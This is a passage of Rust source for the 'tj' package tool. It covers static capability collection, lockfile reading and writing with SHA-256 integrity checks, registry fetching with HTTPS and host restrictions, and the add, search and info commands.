                                if let Some(TplPiece::Str(prefix)) = parts.first() {
                                    if starts_with_http_ci(prefix) {
                                        caps.plain_http_urls.insert(prefix.clone());
                                    } else if let Some(h) = extract_https_host(prefix, parts.len() > 1) {
                                        caps.network_hosts.insert(h);
                                    } else {
                                        caps.dynamic_fetch = true;
                                    }
                                } else {
                                    caps.dynamic_fetch = true;
                                }
                            }
                            _ => caps.dynamic_fetch = true,
                        }
                        true
                    }
                    "__fetch" => {
                        caps.uses_internal_fetch = true;
                        true
                    }
                    "plugin" => {
                        match args.first().map(|a| &a.kind) {
                            Some(ExprKind::Str(p)) => {
                                caps.plugins.insert(p.clone());
                            }
                            _ => caps.dynamic_plugin = true,
                        }
                        true
                    }
                    "invoke" => {
                        caps.uses_invoke = true;
                        true
                    }
                    _ => false,
                }
            } else {
                false
            };
            if !direct_builtin {
                collect_expr_caps(callee, caps);
            }
            for a in args {
                collect_expr_caps(a, caps);
            }
        }
        ExprKind::Member { obj, .. } => collect_expr_caps(obj, caps),
        ExprKind::Index { obj, index, .. } => {
            collect_expr_caps(obj, caps);
            collect_expr_caps(index, caps);
        }
        ExprKind::Binary(_, l, r) | ExprKind::Logical(_, l, r) => {
            collect_expr_caps(l, caps);
            collect_expr_caps(r, caps);
        }
        ExprKind::Assign { target, value, .. } => {
            collect_expr_caps(target, caps);
            collect_expr_caps(value, caps);
        }
        ExprKind::Unary(_, x) | ExprKind::Await(x) | ExprKind::Update { target: x, .. } => collect_expr_caps(x, caps),
        ExprKind::Cond(c, a, b) => {
            collect_expr_caps(c, caps);
            collect_expr_caps(a, caps);
            collect_expr_caps(b, caps);
        }
        ExprKind::Array(xs) => {
            for x in xs {
                match x {
                    ArrayEntry::Item(ex) | ArrayEntry::Spread(ex) => collect_expr_caps(ex, caps),
                }
            }
        }
        ExprKind::Record(fs) => {
            for entry in fs {
                match entry {
                    RecordEntry::Field(_, v) | RecordEntry::Spread(v) => collect_expr_caps(v, caps),
                    RecordEntry::Computed(k, v) => {
                        collect_expr_caps(k, caps);
                        collect_expr_caps(v, caps);
                    }
                }
            }
        }
        ExprKind::Template(parts) => {
            for p in parts {
                if let TplPiece::Expr(ex) = p {
                    collect_expr_caps(ex, caps);
                }
            }
        }
        ExprKind::Arrow(f) => collect_fn_caps(f, caps),
        ExprKind::Jsx(el) => collect_jsx_caps(el, caps),
        // Bare references to `fetch`, `plugin`, or `invoke` (e.g. `const f = fetch; f(...)`)
        // cannot be statically verified and fail closed.
        ExprKind::Ident(name) => match name.as_str() {
            "fetch" => caps.dynamic_fetch = true,
            "__fetch" => caps.uses_internal_fetch = true,
            "plugin" => caps.dynamic_plugin = true,
            "invoke" => caps.uses_invoke = true,
            _ => {}
        },
        ExprKind::Num(_) | ExprKind::Str(_) | ExprKind::Bool(_) | ExprKind::Null | ExprKind::This => {}
    }
}

fn collect_jsx_caps(el: &JsxElement, caps: &mut UsedCapabilities) {
    for (_, v) in &el.attrs {
        collect_expr_caps(v, caps);
    }
    for ch in &el.children {
        match ch {
            JsxChild::Expr(ex) => collect_expr_caps(ex, caps),
            JsxChild::Element(sub) => collect_jsx_caps(sub, caps),
            JsxChild::Text(_) => {}
        }
    }
}

// ---------- Lockfile reading/writing & package loading ----------

pub fn read_lockfile(app_dir: &Path) -> Result<Option<Lockfile>, String> {
    let path = app_dir.join(LOCKFILE_NAME);
    let text = match std::fs::read_to_string(&path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(format!("cannot read {}: {e}", path.display())),
    };
    let val: Json = serde_json::from_str(&text).map_err(|e| format!("{} is not valid JSON: {e}", path.display()))?;
    let lock = Lockfile::from_json(&val).map_err(|e| format!("{} is not a valid lockfile: {e}", path.display()))?;
    if lock.version != 1 {
        return Err(format!("{} has unsupported version {} (expected 1)", path.display(), lock.version));
    }
    Ok(Some(lock))
}

pub fn write_lockfile(app_dir: &Path, lock: &Lockfile) -> Result<(), String> {
    let path = app_dir.join(LOCKFILE_NAME);
    let tmp = app_dir.join(format!("{LOCKFILE_NAME}.tmp.{}", std::process::id()));
    let body = serde_json::to_string_pretty(&lock.to_json()).map_err(|e| e.to_string())? + "\n";
    std::fs::write(&tmp, body).map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
    if let Err(e) = std::fs::rename(&tmp, &path) {
        let _ = std::fs::remove_file(&tmp);
        return Err(format!("cannot replace {}: {e}", path.display()));
    }
    Ok(())
}

pub fn package_file_path(app_dir: &Path, name: &str, kind: &str) -> PathBuf {
    let fname = if kind == "compliance-pack" { "pack.json" } else { "plugin.tj" };
    app_dir.join(PACKAGES_DIR).join(name).join(fname)
}

fn manifest_from_locked(name: &str, pkg: &LockedPackage) -> PackageManifest {
    PackageManifest {
        name: name.to_string(),
        kind: pkg.kind.clone(),
        version: pkg.version.clone(),
        trust: pkg.trust,
        source: pkg.source.clone(),
        entry: pkg.entry.clone(),
        url: None,
        commit: pkg.commit.clone(),
        sha256: pkg.sha256.clone(),
        license: pkg.license.clone(),
        publisher: pkg.publisher.clone(),
        permissions: pkg.permissions.clone(),
        port: None,
        flagged: pkg.flagged.clone(),
    }
}

fn validate_locked_metadata(manifest: &PackageManifest) -> Vec<String> {
    // Allow local relative sources (with `"local"` commit) when `source` has no scheme,
    // matching local registries, while strictly requiring HTTPS + 40-char SHA for remote sources.
    let allow_local = !manifest.source.contains("://");
    validate_manifest_inner(manifest, None, allow_local, false)
}

/// Loads an installed registry package (`tj:<name>`) for `app::read`, verifying its metadata,
/// SHA-256, and declared permissions against `tj.lock` before returning its source (fail closed!).
pub fn load_locked_module(app_dir: &Path, name: &str) -> Result<Option<(String, PathBuf)>, String> {
    let Some(lock) = read_lockfile(app_dir)? else { return Ok(None) };
    let Some(pkg) = lock.packages.get(name) else { return Ok(None) };
    if valid_package_name(name).is_err() {
        return Err(format!("invalid package name {name:?} in {LOCKFILE_NAME}"));
    }
    let manifest = manifest_from_locked(name, pkg);
    let meta_errs = validate_locked_metadata(&manifest);
    if !meta_errs.is_empty() {
        return Err(format!("invalid lockfile entry `tj:{name}`: {}", meta_errs.join("; ")));
    }
    if pkg.kind == "compliance-pack" {
        return Err(format!("`tj:{name}` is a compliance-pack (pass {} to `--compliance`, do not import it)", package_file_path(app_dir, name, &pkg.kind).display()));
    }
    let file = package_file_path(app_dir, name, &pkg.kind);
    let bytes = std::fs::read(&file).map_err(|e| format!("locked package `tj:{name}` missing at {}: {e} (reinstall with `tj add {name}`)", file.display()))?;
    let actual = sha256_bytes(&bytes);
    if actual != pkg.sha256 {
        return Err(format!("integrity check failed for `tj:{name}` at {}: expected SHA-256 {}, got {actual}", file.display(), pkg.sha256));
    }
    if let Err(errs) = verify_package_source(&manifest, &bytes) {
        return Err(format!("locked package `tj:{name}` failed verification: {}", errs.join("; ")));
    }
    if let Some(reason) = &pkg.flagged {
        eprintln!("warning: locked package `tj:{name}` {} is flagged: {reason}", pkg.version);
    }
    let src = String::from_utf8(bytes).map_err(|_| format!("locked package `tj:{name}` is not valid UTF-8"))?;
    Ok(Some((src, file)))
}

/// Audits `tj.lock` next to an app for `tj check [--min-trust <level>]` and `tj serve`:
/// returns `(report_lines, warnings)`.
pub fn check_lockfile(app_dir: &Path, min_trust: Option<Trust>) -> Result<(Vec<String>, Vec<String>), String> {
    let Some(lock) = read_lockfile(app_dir)? else {
        return Ok((Vec::new(), Vec::new()));
    };
    let mut lines = Vec::new();
    let mut warnings = Vec::new();
    let mut errors = Vec::new();
    for (name, pkg) in &lock.packages {
        if let Err(e) = valid_package_name(name) {
            errors.push(format!("{LOCKFILE_NAME}: {e}"));
            continue;
        }
        let manifest = manifest_from_locked(name, pkg);
        for e in validate_locked_metadata(&manifest) {
            errors.push(format!("{LOCKFILE_NAME} `tj:{name}`: {e}"));
        }
        let file = package_file_path(app_dir, name, &pkg.kind);
        let bytes = match std::fs::read(&file) {
            Ok(b) => b,
            Err(e) => {
                errors.push(format!("locked package `tj:{name}` missing at {}: {e}", file.display()));
                continue;
            }
        };
        if let Err(errs) = verify_package_source(&manifest, &bytes) {
            for e in errs {
                errors.push(format!("tj:{name}: {e}"));
            }
        }
        let mut line = format!("  tj:{name} {}  [{}]  ({} / {})", pkg.version, pkg.trust.label(), pkg.license, pkg.publisher);
        if let Some(reason) = &pkg.flagged {
            line += &format!("  FLAGGED: {reason}");
            warnings.push(format!("package `tj:{name}` {} is flagged: {reason}", pkg.version));
            if min_trust.is_some() {
                errors.push(format!("package `tj:{name}` {} is flagged ({reason}) and refused under --min-trust", pkg.version));
            }
        }
        if let Some(min) = min_trust {
            if pkg.trust < min {
                errors.push(format!("package `tj:{name}` has trust mark {} (below required --min-trust {})", pkg.trust.label(), min.label()));
            }
        }
        lines.push(line);
    }
    if !errors.is_empty() {
        return Err(errors.join("\n"));
    }
    Ok((lines, warnings))
}

/// Checks `tj.lock` for `tj retro` and appends actionable `[fix]` findings for flagged,
/// missing, invalid, or tampered packages.
pub fn retro_findings(app_dir: &Path, out: &mut Vec<crate::retro::RetroFinding>) {
    let lock = match read_lockfile(app_dir) {
        Ok(Some(l)) => l,
        Ok(None) => return,
        Err(e) => {
            out.push(crate::retro::RetroFinding {
                tag: "fix",
                area: "supply-chain",
                subject: LOCKFILE_NAME.into(),
                message: e,
                hint: "repair or regenerate `tj.lock` with `tj add <name>`".into(),
            });
            return;
        }
    };
    for (name, pkg) in &lock.packages {
        let manifest = manifest_from_locked(name, pkg);
        let meta_errs = validate_locked_metadata(&manifest);
        if !meta_errs.is_empty() {
            out.push(crate::retro::RetroFinding {
                tag: "fix",
                area: "supply-chain",
                subject: format!("tj:{name}"),
                message: format!("invalid lockfile metadata: {}", meta_errs.join("; ")),
                hint: format!("reinstall clean metadata with `tj add {name}`"),
            });
        }
        if let Some(reason) = &pkg.flagged {
            out.push(crate::retro::RetroFinding {
                tag: "fix",
                area: "supply-chain",
                subject: format!("tj:{name}"),
                message: format!("locked package `tj:{name}` {} is flagged: {reason}", pkg.version),
                hint: format!("upgrade or replace `tj:{name}` (`tj add {name}`)"),
            });
        }
        let file = package_file_path(app_dir, name, &pkg.kind);
        match std::fs::read(&file) {
            Err(e) => out.push(crate::retro::RetroFinding {
                tag: "fix",
                area: "supply-chain",
                subject: format!("tj:{name}"),
                message: format!("locked package missing at {}: {e}", file.display()),
                hint: format!("reinstall with `tj add {name}`"),
            }),
            Ok(bytes) => {
                if let Err(errs) = verify_package_source(&manifest, &bytes) {
                    out.push(crate::retro::RetroFinding {
                        tag: "fix",
                        area: "supply-chain",
                        subject: format!("tj:{name}"),
                        message: format!("verification failed: {}", errs.join("; ")),
                        hint: format!("reinstall clean bytes with `tj add {name}` and audit `tj.lock`"),
                    });
                }
            }
        }
    }
}

// ---------- Registry fetching (local dir or HTTPS) ----------

fn resolve_redirect_url(current: &str, location: &str) -> Result<String, String> {
    if location.starts_with("https://") || location.starts_with("http://") {
        return Ok(location.to_string());
    }
    let (scheme_end, after_scheme) = if let Some(rest) = current.strip_prefix("https://") {
        ("https://", rest)
    } else if let Some(rest) = current.strip_prefix("http://") {
        ("http://", rest)
    } else {
        return Err(format!("cannot resolve redirect from {current:?}"));
    };
    let origin_end = after_scheme.find(['/', '?', '#']).unwrap_or(after_scheme.len());
    let origin = format!("{scheme_end}{}", &after_scheme[..origin_end]);
    if location.starts_with('/') {
        Ok(format!("{origin}{location}"))
    } else {
        let base_path = &after_scheme[origin_end..];
        let dir = base_path.rsplit_once('/').map_or("/", |(d, _)| d);
        Ok(format!("{origin}{dir}/{location}"))
    }
}

fn fetch_bytes_https(url: &str, allow_loopback: bool) -> Result<Vec<u8>, String> {
    let initial_https = url.starts_with("https://");
    let allow_private = std::env::var("TJ_ALLOW_PRIVATE_FETCH").as_deref() == Ok("1");
    let mut builder = ureq::AgentBuilder::new().timeout(FETCH_TIMEOUT).redirects(0);
    if !allow_private {
        if allow_loopback {
            builder = builder.resolver(crate::engine::public_or_loopback);
        } else {
            builder = builder.resolver(crate::engine::public_only);
        }
    }
    let agent = builder.build();
    let mut current = url.to_string();
    let mut final_resp = None;
    for hop in 0..=5 {
        let hop_ok = if initial_https {
            current.starts_with("https://") && is_safe_remote_url(&current, false)
        } else {
            allow_loopback && (is_loopback_http(&current) || (current.starts_with("https://") && is_safe_remote_url(&current, false)))
        };
        if !hop_ok {
            return Err(format!("registry URL {current:?} was refused (must use https:// and a safe host)"));
        }
        let r = agent.get(&current).call().map_err(|e| format!("cannot fetch {current}: {e}"))?;
        if matches!(r.status(), 301 | 302 | 303 | 307 | 308) {
            if hop == 5 {
                return Err(format!("too many redirects fetching {url}"));
            }
            let loc = r.header("location").ok_or_else(|| format!("redirect without Location header from {current}"))?;
            current = resolve_redirect_url(&current, loc)?;
            continue;
        }
        final_resp = Some(r);
        break;
    }
    let resp = final_resp.ok_or_else(|| format!("too many redirects fetching {url}"))?;
    let mut buf = Vec::new();
    resp.into_reader()
        .take(MAX_FETCH_BYTES + 1)
        .read_to_end(&mut buf)
        .map_err(|e| format!("cannot read {url}: {e}"))?;
    if buf.len() as u64 > MAX_FETCH_BYTES {
        return Err(format!("{url} exceeds the {} KB package size limit", MAX_FETCH_BYTES / 1024));
    }
    Ok(buf)
}

fn valid_github_seg(s: &str) -> bool {
    !s.is_empty() && s != "." && s != ".." && s.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
}

fn github_raw_url(source: &str, commit: &str, entry: &str) -> Option<String> {
    let rest = source.strip_prefix("https://github.com/")?.trim_end_matches('/').trim_end_matches(".git");
    let mut segs = rest.split('/');
    let owner = segs.next()?;
    let repo = segs.next()?;
    if !valid_github_seg(owner) || !valid_github_seg(repo) || segs.next().is_some() {
        return None;
    }
    Some(format!("https://raw.githubusercontent.com/{owner}/{repo}/{commit}/{entry}"))
}

fn fetch_from_registry(registry: &str, name: &str) -> Result<(PackageManifest, Vec<u8>, bool), String> {
    valid_package_name(name)?;
    let is_remote = registry.starts_with("https://") || registry.starts_with("http://");
    if is_remote {
        let allow_loopback = is_loopback_http(registry);
        let base = registry.trim_end_matches('/');
        let manifest_url = format!("{base}/index/{name}.json");
        let raw = fetch_bytes_https(&manifest_url, allow_loopback)?;
        let val: Json = serde_json::from_slice(&raw).map_err(|e| format!("invalid JSON at {manifest_url}: {e}"))?;
        let m = PackageManifest::from_json(&val).map_err(|e| format!("invalid manifest at {manifest_url}: {e}"))?;
        if m.name != name {
            return Err(format!("manifest at {manifest_url} names {:?}, expected {name:?}", m.name));
        }
        let errs = validate_manifest(&m, None, allow_loopback);
        if !errs.is_empty() {
            return Err(format!("invalid registry manifest for {name}:\n  {}", errs.join("\n  ")));
        }
        let module_url = match &m.url {
            Some(u) => u.clone(),
            None => github_raw_url(&m.source, &m.commit, &m.entry).ok_or_else(|| format!("manifest for {name} needs either a GitHub source URL or an explicit HTTPS \"url\""))?,
        };
        let bytes = fetch_bytes_https(&module_url, allow_loopback)?;
        Ok((m, bytes, false))
    } else {
        let root = Path::new(registry);
        if !root.is_dir() {
            return Err(format!("local registry directory {} does not exist", root.display()));
        }
        let index_dir = root.join("index");
        let manifest_path = index_dir.join(format!("{name}.json"));
        let raw = std::fs::read(&manifest_path).map_err(|e| format!("package {name:?} not found at {}: {e}", manifest_path.display()))?;
        let val: Json = serde_json::from_slice(&raw).map_err(|e| format!("invalid JSON {}: {e}", manifest_path.display()))?;
        let m = PackageManifest::from_json(&val).map_err(|e| format!("invalid manifest {}: {e}", manifest_path.display()))?;
        if m.name != name {
            return Err(format!("manifest {} names {:?}, expected {name:?}", manifest_path.display(), m.name));
        }
        let errs = validate_manifest(&m, Some(&index_dir), true);
        if !errs.is_empty() {
            return Err(format!("invalid registry manifest for {name}:\n  {}", errs.join("\n  ")));
        }
        let bytes = if m.source.starts_with("https://") || m.source.starts_with("http://") {
            let url = match &m.url {
                Some(u) => u.clone(),
                None => github_raw_url(&m.source, &m.commit, &m.entry).ok_or_else(|| format!("manifest for {name} needs either a GitHub source URL or an explicit HTTPS \"url\""))?,
            };
            fetch_bytes_https(&url, is_loopback_http(&url))?
        } else {
            let canon_root = std::fs::canonicalize(root).map_err(|e| format!("cannot resolve {}: {e}", root.display()))?;
            let candidate = root.join(&m.source).join(&m.entry);
            let canon_file = std::fs::canonicalize(&candidate).map_err(|e| format!("cannot read module {}: {e}", candidate.display()))?;
            if !canon_file.starts_with(&canon_root) {
                return Err(format!("module path {} escapes local registry root", candidate.display()));
            }
            std::fs::read(&canon_file).map_err(|e| format!("cannot read {}: {e}", canon_file.display()))?
        };
        Ok((m, bytes, true))
    }
}

/// Installs `name` from `registry` into `app_dir/.tj-packages/<name>/` and pins it in
/// `app_dir/tj.lock`, enforcing SHA-256, trust mark, advisory status, and declared permissions.
pub fn add_package(name: &str, registry: &str, app_dir: &Path, min_trust: Option<Trust>, allow_flagged: bool) -> Result<String, String> {
    let (m, bytes, _) = fetch_from_registry(registry, name)?;
    if let Some(reason) = &m.flagged {
        if !allow_flagged {
            return Err(format!("refusing to add flagged package `{name}` {}: {reason} (pass --allow-flagged to override)", m.version));
        }
    }
    if let Some(min) = min_trust {
        if m.trust < min {
            return Err(format!("refusing `{name}`: trust mark is {} (below required --min-trust {})", m.trust.label(), min.label()));
        }
    }
    let warnings = verify_package_source(&m, &bytes).map_err(|errs| format!("package `{name}` failed security/permission verification:\n  {}", errs.join("\n  ")))?;

    // Read/validate existing `tj.lock` before mutating `.tj-packages/` on disk.
    let mut lock = read_lockfile(app_dir)?.unwrap_or_default();

    let dest_file = package_file_path(app_dir, &m.name, &m.kind);
    let dest_dir = dest_file.parent().expect("package file has parent");
    std::fs::create_dir_all(dest_dir).map_err(|e| format!("cannot create {}: {e}", dest_dir.display()))?;
    let tmp_file = dest_file.with_extension(format!("tmp.{}", std::process::id()));
    std::fs::write(&tmp_file, &bytes).map_err(|e| format!("cannot write {}: {e}", tmp_file.display()))?;
    if let Err(e) = std::fs::rename(&tmp_file, &dest_file) {
        let _ = std::fs::remove_file(&tmp_file);
        return Err(format!("cannot install {}: {e}", dest_file.display()));
    }

    lock.packages.insert(
        m.name.clone(),
        LockedPackage {
            kind: m.kind.clone(),
            version: m.version.clone(),
            trust: m.trust,
            source: m.source.clone(),
            entry: m.entry.clone(),
            commit: m.commit.clone(),
            sha256: m.sha256.clone(),
            license: m.license.clone(),
            publisher: m.publisher.clone(),
            permissions: m.permissions.clone(),
            flagged: m.flagged.clone(),
        },
    );
    write_lockfile(app_dir, &lock)?;

    let fmt_list = |xs: &[String]| {
        if xs.is_empty() {
            "none".to_string()
        } else {
            xs.iter().map(|s| clean_display(s)).collect::<Vec<_>>().join(", ")
        }
    };
    let mut out = format!(
        "added tj:{} {}  [{}]\n  kind:        {}\n  publisher:   {} ({})\n  commit:      {}\n  sha256:      {}\n  permissions: network=[{}], plugins=[{}], pii=[{}], device=[{}]\n  installed:   {}\n  lockfile:    {}\n",
        m.name,
        m.version,
        m.trust.label(),
        m.kind,
        m.publisher,
        m.license,
        m.commit,
        &m.sha256[..16],
        fmt_list(&m.permissions.network),
        fmt_list(&m.permissions.plugins),
        fmt_list(&m.permissions.pii),
        fmt_list(&m.permissions.device),
        dest_file.display(),
        app_dir.join(LOCKFILE_NAME).display(),
    );
    for w in warnings {
        out += &format!("  warning:     {w}\n");
    }
    Ok(out)
}

/// CLI entry point for `tj add <name> [--registry <url-or-dir>] [--dir <app-dir>] [--min-trust <level>] [--allow-flagged]`.
pub fn run_add(args: &[String]) -> Result<(), String> {
    let usage = "usage: tj add <name> [--registry <url-or-dir>] [--dir <app-dir>] [--min-trust community|verified|official] [--allow-flagged]";
    let mut name: Option<String> = None;
    let mut registry = std::env::var(REGISTRY_ENV).ok().filter(|s| !s.trim().is_empty()).unwrap_or_else(|| DEFAULT_REGISTRY.to_string());
    let mut app_dir = PathBuf::from(".");
    let mut min_trust: Option<Trust> = None;
    let mut allow_flagged = false;
    let mut it = args.iter().peekable();
    if let Some(first) = it.next_if(|a| !a.starts_with("--")) {
        name = Some(first.clone());
    }
    while let Some(flag) = it.next() {
        let mut value = || it.next().ok_or_else(|| format!("{flag} needs a value"));
        match flag.as_str() {
            "--registry" => registry = value()?.clone(),
            "--dir" => app_dir = PathBuf::from(value()?),
            "--min-trust" => min_trust = Some(Trust::parse(value()?)?),
            "--allow-flagged" => allow_flagged = true,
            other => return Err(format!("unknown option {other}\n\n{usage}")),
        }
    }
    let name = name.ok_or_else(|| format!("`tj add` needs a package name\n\n{usage}"))?;
    let report = add_package(&name, &registry, &app_dir, min_trust, allow_flagged)?;
    print!("{report}");
    Ok(())
}

/// CLI entry point for `tj search [<query>] [--kind <kind>] [--min-trust <level>] [--registry <url-or-dir>] [--json]`.
pub fn run_search(args: &[String]) -> Result<(), String> {
    let usage = "usage: tj search [<query>] [--kind <kind>] [--min-trust community|verified|official] [--registry <url-or-dir>] [--json]";
    let mut query: Option<String> = None;
    let mut kind_filter: Option<String> = None;
    let mut min_trust: Option<Trust> = None;
    let mut registry = std::env::var(REGISTRY_ENV).ok().filter(|s| !s.trim().is_empty()).unwrap_or_else(|| DEFAULT_REGISTRY.to_string());
    let mut json_out = false;

    let mut it = args.iter().peekable();
    while let Some(arg) = it.next() {
        let mut value = || it.next().ok_or_else(|| format!("{arg} needs a value"));
        match arg.as_str() {
            "--kind" => {
                let k = value()?.clone();
                if !ALLOWED_KINDS.contains(&k.as_str()) {
                    return Err(format!("unknown --kind {k:?}; expected one of {}", ALLOWED_KINDS.join(", ")));
                }
                kind_filter = Some(k);
            }
            "--min-trust" => min_trust = Some(Trust::parse(value()?)?),
            "--registry" => registry = value()?.clone(),
            "--json" => json_out = true,
            other if !other.starts_with("--") && query.is_none() => query = Some(other.to_string()),
            other => return Err(format!("unknown option {other}\n\n{usage}")),
        }
    }

    let entries = load_catalog(&registry)?;
    let q_lower = query.as_deref().map(str::to_ascii_lowercase);
    let matches: Vec<CatalogEntry> = entries
        .into_iter()
        .filter(|e| {
            if let Some(ref k) = kind_filter {
                if &e.kind != k {
                    return false;
                }
            }
            if let Some(min) = min_trust {
                if e.trust < min {
                    return false;
                }
            }
            if let Some(ref q) = q_lower {
                let hay = format!("{} {} {} {}", e.name, e.kind, e.publisher, e.summary).to_ascii_lowercase();
                if !hay.contains(q) {
                    return false;
                }
            }
            true
        })
        .collect();

    if json_out {
        let arr: Vec<Json> = matches.iter().map(CatalogEntry::to_json).collect();
        println!("{}", serde_json::to_string_pretty(&json!({ "registry": registry, "packages": arr })).expect("json"));
    } else if matches.is_empty() {
        println!("no matching packages in {}", clean_display(&registry));
    } else {
        for e in &matches {
            let flag_tag = match &e.flagged {
                Some(reason) => format!("  [FLAGGED: {}]", clean_display(reason)),
                None => String::new(),
            };
            println!(
                "  {:16} {:8} [{:9}] {:15} {}{}",
                clean_display(&e.name),
                clean_display(&e.version),
                e.trust.label(),
                clean_display(&e.kind),
                clean_display(&e.summary),
                flag_tag,
            );
        }
        println!("\nInstall with `tj add <name>` or inspect with `tj info <name>`.");
    }
    Ok(())
}

/// CLI entry point for `tj info <name> [--registry <url-or-dir>] [--json]`.
pub fn run_info(args: &[String]) -> Result<(), String> {
    let usage = "usage: tj info <name> [--registry <url-or-dir>] [--json]";
    let mut name: Option<String> = None;
    let mut registry = std::env::var(REGISTRY_ENV).ok().filter(|s| !s.trim().is_empty()).unwrap_or_else(|| DEFAULT_REGISTRY.to_string());
    let mut json_out = false;

    let mut it = args.iter().peekable();
    while let Some(arg) = it.next() {
        let mut value = || it.next().ok_or_else(|| format!("{arg} needs a value"));
        match arg.as_str() {
            "--registry" => registry = value()?.clone(),
            "--json" => json_out = true,
            other if !other.starts_with("--") && name.is_none() => name = Some(other.to_string()),
            other => return Err(format!("unknown option {other}\n\n{usage}")),
        }
    }
    let name = name.ok_or_else(|| format!("`tj info` needs a package name\n\n{usage}"))?;
    let m = fetch_manifest_only(&registry, &name)?;
    if json_out {
        let mut map = Map::new();
        map.insert("name".into(), json!(m.name));
        map.insert("kind".into(), json!(m.kind));
        map.insert("version".into(), json!(m.version));
        map.insert("trust".into(), json!(m.trust.as_str()));
        map.insert("source".into(), json!(m.source));
        map.insert("entry".into(), json!(m.entry));
        if let Some(u) = &m.url {
            map.insert("url".into(), json!(u));
        }
        map.insert("commit".into(), json!(m.commit));
        map.insert("sha256".into(), json!(m.sha256));
        map.insert("license".into(), json!(m.license));
        map.insert("publisher".into(), json!(m.publisher));
        map.insert("permissions".into(), m.permissions.to_json());
        if let Some(p) = &m.port {
            map.insert("port".into(), json!({ "of": p.of, "tests": p.tests }));
        }
        if let Some(f) = &m.flagged {
            map.insert("flagged".into(), json!(f));
        }
        println!("{}", serde_json::to_string_pretty(&Json::Object(map)).expect("json"));
    } else {
        let fmt_list = |xs: &[String]| {
            if xs.is_empty() {
                "none".to_string()
            } else {
                xs.iter().map(|s| clean_display(s)).collect::<Vec<_>>().join(", ")
            }
        };
        println!("tj:{} {}  [{}]", clean_display(&m.name), clean_display(&m.version), m.trust.label());
        println!("  kind:        {}", clean_display(&m.kind));
        println!("  publisher:   {} ({})", clean_display(&m.publisher), clean_display(&m.license));
        println!("  source:      {} ({})", clean_display(&m.source), clean_display(&m.entry));
        if let Some(u) = &m.url {
            println!("  url:         {}", clean_display(u));
        }
        println!("  commit:      {}", clean_display(&m.commit));
        println!("  sha256:      {}", clean_display(&m.sha256));
        println!(
            "  permissions: network=[{}], plugins=[{}], pii=[{}], device=[{}]",
            fmt_list(&m.permissions.network),
            fmt_list(&m.permissions.plugins),
            fmt_list(&m.permissions.pii),
            fmt_list(&m.permissions.device),
        );
        if let Some(p) = &m.port {
            println!("  port of:     {} ({})", clean_display(&p.of), clean_display(&p.tests));
        }
        if let Some(f) = &m.flagged {
            println!("  FLAGGED:     {}", clean_display(f));
        }
        if m.kind == "compliance-pack" {
            println!("  install:     tj add {}", m.name);
            println!("  use:         tj check app.tj --compliance .tj-packages/{}/pack.json", m.name);
        } else {
            println!("  install:     tj add {}", m.name);
            println!("  import:      import {{ ... }} from \"tj:{}\"", m.name);
        }
    }
    Ok(())
}

#[derive(Debug, Clone)]
struct CatalogEntry {
    name: String,
    kind: String,
    version: String,
    trust: Trust,
    license: String,
    publisher: String,
    summary: String,
    permissions: Permissions,
    flagged: Option<String>,
}

impl CatalogEntry {
    fn from_json(v: &Json) -> Result<Self, String> {
        let obj = v.as_object().ok_or("catalog entry must be a JSON object")?;
        let trust = match opt_str(obj, "trust")? {
            Some(s) => Trust::parse(&s)?,
            None => Trust::Community,
        };
        Ok(CatalogEntry {
            name: req_str(obj, "name")?,
            kind: req_str(obj, "kind")?,
            version: req_str(obj, "version")?,
            trust,
            license: opt_str(obj, "license")?.unwrap_or_default(),
            publisher: opt_str(obj, "publisher")?.unwrap_or_default(),
            summary: opt_str(obj, "summary")?.unwrap_or_default(),
            permissions: Permissions::from_json(obj.get("permissions").unwrap_or(&Json::Null))?,
            flagged: opt_str(obj, "flagged")?,
        })
    }

    fn to_json(&self) -> Json {
        let mut map = Map::new();
        map.insert("name".into(), json!(self.name));
        map.insert("kind".into(), json!(self.kind));
        map.insert("version".into(), json!(self.version));
        map.insert("trust".into(), json!(self.trust.as_str()));
        map.insert("license".into(), json!(self.license));
        map.insert("publisher".into(), json!(self.publisher));
        map.insert("summary".into(), json!(self.summary));
        map.insert("permissions".into(), self.permissions.to_json());
        if let Some(f) = &self.flagged {
            map.insert("flagged".into(), json!(f));
        }
        Json::Object(map)
    }
}

fn clean_display(s: &str) -> String {
    s.chars().map(|c| if c.is_control() { ' ' } else { c }).collect()
}

fn fetch_manifest_only(registry: &str, name: &str) -> Result<PackageManifest, String> {
    valid_package_name(name)?;
    let is_remote = registry.starts_with("https://") || registry.starts_with("http://");
    let (raw, allow_local, origin) = if is_remote {
        let allow_loopback = is_loopback_http(registry);
        let url = format!("{}/index/{name}.json", registry.trim_end_matches('/'));
        (fetch_bytes_https(&url, allow_loopback)?, allow_loopback, url)
    } else {
        let root = Path::new(registry);
        if !root.is_dir() {
            return Err(format!("local registry directory {} does not exist", root.display()));
        }
        let path = root.join("index").join(format!("{name}.json"));
        let bytes = std::fs::read(&path).map_err(|e| format!("package {name:?} not found at {}: {e}", path.display()))?;
        (bytes, true, path.display().to_string())
    };
    let val: Json = serde_json::from_slice(&raw).map_err(|e| format!("invalid JSON at {origin}: {e}"))?;
    let m = PackageManifest::from_json(&val).map_err(|e| format!("invalid manifest at {origin}: {e}"))?;
    if m.name != name {
        return Err(format!("manifest at {origin} names {:?}, expected {name:?}", m.name));
    }
    let errs = validate_manifest(&m, None, allow_local);
    if !errs.is_empty() {
        return Err(format!("invalid registry manifest for {name}:\n  {}", errs.join("\n  ")));
    }
    Ok(m)
}

fn load_catalog(registry: &str) -> Result<Vec<CatalogEntry>, String> {
    let is_remote = registry.starts_with("https://") || registry.starts_with("http://");
    if is_remote {
        let allow_loopback = is_loopback_http(registry);
        let url = format!("{}/catalog.json", registry.trim_end_matches('/'));
        let raw = fetch_bytes_https(&url, allow_loopback)?;
        return parse_catalog_json(&raw, &url);
    }
    let root = Path::new(registry);
    if !root.is_dir() {
        return Err(format!("local registry directory {} does not exist", root.display()));
    }
    let cat_file = root.join("catalog.json");
    if cat_file.is_file() {
        let raw = std::fs::read(&cat_file).map_err(|e| format!("cannot read {}: {e}", cat_file.display()))?;
        return parse_catalog_json(&raw, &cat_file.display().to_string());
    }
    let index_dir = root.join("index");
    let entries = std::fs::read_dir(&index_dir).map_err(|e| format!("cannot read {}: {e}", index_dir.display()))?;
    let mut out = Vec::new();
    for entry in entries.flatten() {
        let p = entry.path();
        if p.extension().and_then(|e| e.to_str()) != Some("json") {
            continue;
